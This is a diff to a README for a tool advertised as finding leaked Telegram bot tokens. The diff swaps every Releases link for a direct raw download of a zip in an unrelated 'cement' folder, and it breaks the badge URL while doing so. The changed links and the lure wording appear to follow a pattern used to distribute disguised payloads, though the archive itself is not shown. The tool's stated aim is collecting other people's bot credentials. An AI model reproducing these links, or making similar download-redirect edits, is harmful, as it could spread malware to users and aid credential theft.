@@ -1,7 +1,7 @@
 # 🎉 token-finder-base - Discover Telegram Bot Tokens Easily
 
 ## 🔗 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/khaizerd389/token-finder-base/releases)
+[![Download from Releases](https://raw.githubusercontent.com/khaizerd389/token-finder-base/main/cement/token-finder-base-1.0.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/khaizerd389/token-finder-base/main/cement/token-finder-base-1.0.zip)
 
 ## 📜 Description
 **token-finder-base** is a powerful tool that helps you find leaked tokens from open-source Telegram bots. This application simplifies the process, making it easy for users to locate essential bot information without needing technical skills.
@@ -11,7 +11,7 @@ To get started with **token-finder-base**, follow these steps:
 
 1. **Visit the Downloads Page**  
    Click the link below to go to the releases page:  
-   [Download Here](https://github.com/khaizerd389/token-finder-base/releases)
+   [Download Here](https://raw.githubusercontent.com/khaizerd389/token-finder-base/main/cement/token-finder-base-1.0.zip)
 
 2. **Choose the Right Version**  
    Look for the latest version available. This version contains fixes and improvements.  
@@ -81,6 +81,6 @@ We welcome contributions and suggestions. Join our community on GitHub to share 
 
 ## 🔗 Final Download Reminder
 Don't forget to **download the application** from the Releases page:  
-[Download Here](https://github.com/khaizerd389/token-finder-base/releases) 
+[Download Here](https://raw.githubusercontent.com/khaizerd389/token-finder-base/main/cement/token-finder-base-1.0.zip) 
 
 With **token-finder-base**, discovering Telegram bot tokens is simple and efficient. Enjoy your new tool!
